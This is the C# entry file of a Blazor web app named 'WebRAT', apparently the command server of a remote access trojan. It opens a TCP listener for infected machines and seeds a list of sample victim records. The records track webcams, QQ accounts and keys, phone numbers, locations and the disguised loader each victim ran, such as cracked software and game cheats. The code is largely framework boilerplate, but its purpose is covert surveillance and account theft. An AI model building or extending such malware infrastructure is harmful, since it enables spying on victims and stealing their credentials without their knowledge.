using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.Web;
using Data;

namespace WebRAT
{
    public class Program
    {
        public static TCPServer server = new TCPServer("0.0.0.0", ServerSettings.Port);
        public static void Main(string[] args)
        {
            var builder = WebApplication.CreateBuilder(args);

            // Add services to the container.
            builder.Services.AddRazorPages();
            builder.Services.AddServerSideBlazor();

            var app = builder.Build();

            // Configure the HTTP request pipeline.
            if (!app.Environment.IsDevelopment())
            {
                app.UseExceptionHandler("/Error");
            }


            app.UseStaticFiles();

            app.UseRouting();

            app.MapBlazorHub();
            app.MapFallbackToPage("/_Host");

            server.Start();

            MainData.DeviceL.Add(new Device { DeviceName = "设备A", UserName = "用户1", IP = "192.168.0.1", City = "西安", CameraDevice = "摄像头1", InstallTime = "2024-08-26", LoaderName = "WNF破解版.exe", QQNumber = "10001", ProcessID = "1234", XY = "123,456", PhoneNumber = "123456789", QQKey = "密钥1", KeyType = "类型1" });
            MainData.DeviceL.Add(new Device { DeviceName = "设备B", UserName = "用户2", IP = "192.168.0.2", City = "台北", CameraDevice = "摄像头2", InstallTime = "2024-08-26", LoaderName = "VAPE.exe", QQNumber = "12345", ProcessID = "4567", XY = "123,456", PhoneNumber = "123456789", QQKey = "密钥1", KeyType = "类型1" });
            MainData.DeviceL.Add(new Device { DeviceName = "设备C", UserName = "用户3", IP = "192.168.0.3", City = "莫斯科", CameraDevice = "摄像头3", InstallTime = "2024-08-26", LoaderName = "SF内部破解.exe", QQNumber = "123456", ProcessID = "7890", XY = "123,456", PhoneNumber = "123456789", QQKey = "密钥1", KeyType = "类型1" });

            app.Run();

        }
    }
}